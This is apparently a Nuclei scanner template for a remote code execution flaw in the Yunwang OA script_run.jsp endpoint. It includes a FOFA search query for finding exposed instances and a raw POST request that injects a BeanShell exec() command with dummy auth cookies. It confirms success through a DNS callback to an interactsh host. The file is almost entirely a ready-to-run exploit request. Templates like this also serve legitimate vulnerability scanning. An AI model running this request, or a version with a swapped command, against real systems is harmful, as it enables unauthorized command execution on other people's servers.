id: yunwang-oa-script_run-bsh-rce
info:
  name: 云网OA script_run.jsp BSH远程代码执行漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="云网OA"
          云网OA（又称一米OA）基于Spring Boot + Vue3架构的企业级低代码协同办公平台，支持MySQL/Oracle多数据库适配及私有化部署。script_run.jsp接口存在BSH脚本引擎远程代码执行缺陷，攻击者可通过构造恶意请求在目标系统执行任意命令。
  tags: 云网OA
http:
- raw:
  - |
    POST /admin/script_run.jsp HTTP/1.1
    Host: {{Hostname}}
    Accept: text/plain, */*; q=0.01
    X-Requested-With: XMLHttpRequest
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: skincode=lte; name=x; JSESSIONID=x; cwbbs.auth=x; pwd=111111
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    op=1&myscript=exec("ping {{interactsh-url}}");
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
